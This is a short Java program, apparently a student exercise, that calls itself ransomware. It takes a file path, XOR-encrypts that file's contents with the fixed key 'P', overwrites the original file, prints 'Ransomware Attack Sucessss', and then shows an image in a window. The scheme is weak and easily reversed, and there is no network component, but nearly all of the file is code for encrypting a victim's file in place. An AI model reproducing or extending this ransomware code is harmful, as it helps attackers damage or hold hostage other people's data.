import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.io.FileWriter; 
import java.io.*;
import java.util.*;
import javax.print.*;
import javax.print.Doc;
import javax.print.DocFlavor;
import javax.print.DocPrintJob;
import javax.print.PrintException;
import javax.print.PrintService;
import javax.print.PrintServiceLookup;
import javax.print.SimpleDoc;
import javax.print.attribute.HashPrintRequestAttributeSet;
import javax.print.attribute.PrintRequestAttributeSet;
import javax.print.attribute.standard.Copies;
import javax.swing.JFrame;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import java.io.FileInputStream;
import java.io.IOException;
class XOREncryption 


{ 
	// The same function is used to encrypt and 
	// decrypt 
	static String encryptDecrypt(String inputString) 
	{ 
		// Define XOR key 
		// Any character value will work 
		char xorKey = 'P'; 

		// Define String to store encrypted/decrypted String 
		String outputString = ""; 

		// calculate length of input string 
		int len = inputString.length(); 

		// perform XOR operation of key 
		// with every caracter in string 
		for (int i = 0; i < len; i++) 
		{ 
			outputString = outputString + 
			Character.toString((char) (inputString.charAt(i) ^ xorKey)); 
		} 

		//System.out.println(outputString); 
		
		return outputString; 
	} 

	// Driver code 
	public static void main(String[] args) 
	{ 
		

System.out.println("Enter the directory to attack (it will encrypt the file !!)");
System.out.println("EX:- /home/ubuntu/myFile.txt (or) C://directory");
Scanner sc = new Scanner(System.in);
		String xyz=sc.nextLine();
		  String path = xyz;



try {

                // default StandardCharsets.UTF_8
                String sampleString = Files.readString(Paths.get(path));
             
		// Encrypt the string 
                System.out.println("");
		System.out.println("Ransomware Attack Sucessss !!!!!"); 
                 System.out.println("");
		String encryptedString = encryptDecrypt(sampleString); 
		

 
                 
                    FileWriter fw=new FileWriter(xyz);    
                    fw.write(encryptedString);    
                    fw.close();    
            
                  


 } 
catch (IOException e) {
            e.printStackTrace();
        }

JFrame frame = new JFrame();
  ImageIcon icon = new ImageIcon("dj.jpg");
  JLabel label = new JLabel(icon);
  frame.add(label);
  frame.setDefaultCloseOperation
         (JFrame.EXIT_ON_CLOSE);
  frame.pack();
  frame.setVisible(true);


 
	} 
} 

// This code is contributed by Vivekkumar Singh 

